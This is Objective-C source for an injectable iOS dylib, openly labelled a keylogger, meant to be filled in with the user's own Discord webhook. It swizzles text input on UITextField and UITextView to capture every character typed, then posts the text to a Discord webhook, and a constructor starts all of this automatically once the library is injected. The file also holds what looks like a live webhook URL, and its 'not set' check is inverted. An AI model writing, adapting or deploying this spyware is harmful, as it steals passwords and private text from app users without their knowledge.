#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>

// =============================================================================
// MARK: - Keylogger Interface
// =============================================================================

@interface Keylogger : NSObject

+ (instancetype)sharedInstance;
- (void)startLogging;
- (void)sendToWebhook:(NSString *)data;

@end

// =============================================================================
// MARK: - Keylogger Implementation
// =============================================================================

@implementation Keylogger

// --- CHANGE THIS TO YOUR DISCORD WEBHOOK URL ---
static NSString *webhookURL = @"YOUR_DISCORD_WEBHOOK_URL";

// --- Singleton ---
+ (instancetype)sharedInstance {
    static Keylogger *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        instance = [[Keylogger alloc] init];
    });
    return instance;
}

// --- Core Swizzling Logic ---
- (void)startLogging {
    NSLog(@"[Keylogger] Starting logging...");
    
    // Swizzle UITextField
    Class textFieldClass = objc_getClass("UITextField");
    if (textFieldClass) {
        Method originalMethod = class_getInstanceMethod(textFieldClass, @selector(insertText:));
        Method swizzledMethod = class_getInstanceMethod([self class], @selector(swizzled_insertText:));
        if (originalMethod && swizzledMethod) {
            method_exchangeImplementations(originalMethod, swizzledMethod);
            NSLog(@"[Keylogger] Successfully swizzled UITextField.");
        }
    }
    
    // Swizzle UITextView
    Class textViewClass = objc_getClass("UITextView");
    if (textViewClass) {
        Method originalMethod = class_getInstanceMethod(textViewClass, @selector(insertText:));
        Method swizzledMethod = class_getInstanceMethod([self class], @selector(swizzled_insertText:));
        if (originalMethod && swizzledMethod) {
            method_exchangeImplementations(originalMethod, swizzledMethod);
            NSLog(@"[Keylogger] Successfully swizzled UITextView.");
        }
    }
    
    NSLog(@"[Keylogger] Logging started.");
}

// --- The Intercepted Method ---
- (void)swizzled_insertText:(NSString *)text {
    // Log the intercepted input
    NSLog(@"[Keylogger] Intercepted text: %@", text);
    [self sendToWebhook:text];
    
    // Call the original method (due to swizzling, this calls the original implementation)
    [self swizzled_insertText:text];
}

// --- Webhook Sender ---
- (void)sendToWebhook:(NSString *)data {
    if ([webhookURL isEqualToString:@"https://discord.com/api/webhooks/1252261340702310422/iUMCrX_RbZl_mHaUFN7czWbczo-88jV1xSC97_bN3AWtsRsUgrpwIl23BRbk1ti7u8ma"]) {
        NSLog(@"[Keylogger] Webhook URL is not set. Aborting send.");
        return;
    }
    
    NSURL *url = [NSURL URLWithString:webhookURL];
    if (!url) {
        NSLog(@"[Keylogger] Invalid webhook URL format.");
        return;
    }
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    
    NSDictionary *jsonDict = @{
        @"content": data,
        @"username": @"Keylogger"
    };
    
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:jsonDict options:0 error:&error];
    
    if (error) {
        NSLog(@"[Keylogger] Error creating JSON: %@", error.localizedDescription);
        return;
    }
    
    [request setHTTPBody:jsonData];
    
    NSURLSession *session = [NSURLSession sharedSession];
    NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"[Keylogger] Error sending to webhook: %@", error.localizedDescription);
        } else {
            NSLog(@"[Keylogger] Webhook sent successfully. Status code: %ld", (long)[(NSHTTPURLResponse *)response statusCode]);
        }
    }];
    [task resume];
}

@end

// =============================================================================
// MARK: - Constructor & Visual Confirmation
// =============================================================================

// Function to show a visual alert
void showConfirmationAlert() {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Dylib Injected"
                                                                       message:@"The Keylogger dylib is active."
                                                                preferredStyle:UIAlertControllerStyleAlert];
        [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
        
        // Find the key window and present the alert
        UIWindow *keyWindow = nil;
        if (@available(iOS 13.0, *)) {
            keyWindow = [[UIApplication sharedApplication] windows].firstObject;
        } else {
            keyWindow = [[UIApplication sharedApplication] keyWindow];
        }
        
        UIViewController *rootViewController = keyWindow.rootViewController;
        if (rootViewController) {
            [rootViewController presentViewController:alert animated:YES completion:nil];
        }
    });
}


// This function runs automatically when the dylib is loaded
__attribute__((constructor))
void initKeylogger() {
    NSLog(@"[Keylogger] Constructor function called.");
    
    // 1. Send a webhook immediately to test connectivity
    [[Keylogger sharedInstance] sendToWebhook:@"Dylib successfully injected and constructor executed."];
    
    // 2. Show a visual alert on the device
    showConfirmationAlert();
    
    // 3. Start the main logging logic
    [[Keylogger sharedInstance] startLogging];
}
